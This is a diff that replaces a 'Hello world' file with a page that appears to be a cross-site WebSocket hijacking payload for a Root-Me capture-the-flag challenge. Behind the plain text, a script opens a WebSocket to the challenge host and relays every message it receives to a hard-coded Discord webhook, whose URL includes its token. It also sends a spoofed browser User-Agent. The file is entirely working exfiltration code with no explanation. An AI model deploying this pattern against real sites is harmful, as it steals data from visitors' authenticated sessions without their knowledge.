@@ -1,1 +1,41 @@
-Hello world
+<head>
+  <script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
+</head>
+
+<body>
+  Hello world
+  <script>
+    $(function () {
+      var input = $("#input");
+      window.WebSocket = window.WebSocket || window.MozWebSocket;
+      if (!window.WebSocket) {
+        alert("Sorry, but your browser doesn't support WebSocket.");
+        window.location.href = "/";
+        return;
+      }
+      var connection = new WebSocket("ws://" + "ctf27.root-me.org" + "/ws");
+      connection.onopen = function () {
+        connection.send("Hello");
+      };
+
+      connection.onmessage = function (message) {
+        const data = message["data"];
+        const webhook =
+          "https://discord.com/api/webhooks/973296015799111812/KU1Rh3CrfvoJ2AduZv_EIp4CU5-bkhkmUiP_fW0IYDQxR3S1J9_1fHvTeK6FumvBopbF";
+        fetch(webhook, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+            "User-Agent":
+              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
+          },
+          body: JSON.stringify({
+            username: "root-me.orgqsdqsd",
+            avatar_url: "https://root-me.org/images/logo.png",
+            content: `${data}`,
+          }),
+        }).then((res) => res.json());
+      };
+    });
+  </script>
+</body>
